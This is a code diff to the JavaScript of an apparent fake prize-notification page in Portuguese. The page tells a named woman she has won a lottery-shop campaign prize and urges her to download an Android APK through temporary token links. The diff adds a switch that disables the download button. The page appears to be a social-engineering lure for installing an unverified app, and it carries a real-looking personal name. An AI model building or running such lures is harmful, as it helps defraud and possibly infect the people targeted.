@@ -4,6 +4,7 @@ const APK_LINK_URL=WORKER_BASE+'/api/v1/generate-token';
 const STORAGE_KEY='campanha-premiada-settings';
 
 const defaults={
+  downloadEnabled:'false',
   customerName:'VERA LÚCIA APARECIDA GNANI',
   campaignName:'Familhão da Lotérica',
   message:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
@@ -25,6 +26,12 @@ function setText(id,value){
 
 function render(){
   const s=settings;
+  const downloadButton=document.getElementById('apkDownloadButton');
+  if(downloadButton){
+    const enabled=String(s.downloadEnabled)==='true';
+    downloadButton.disabled=!enabled;
+    downloadButton.textContent=enabled?'Baixar aplicativo':'Download temporariamente indisponível';
+  }
   setText('customerName',(s.customerName||defaults.customerName).toUpperCase());
   setText('campaignName',s.campaignName||defaults.campaignName);
   setText('message',s.message||defaults.message);
@@ -159,7 +166,7 @@ async function requestTemporaryApkLink(){
 
 async function downloadApk(){
   const button=document.getElementById('apkDownloadButton');
-  if(!button) return;
+  if(!button || button.disabled) return;
 
   const original=button.textContent;
   button.disabled=true;
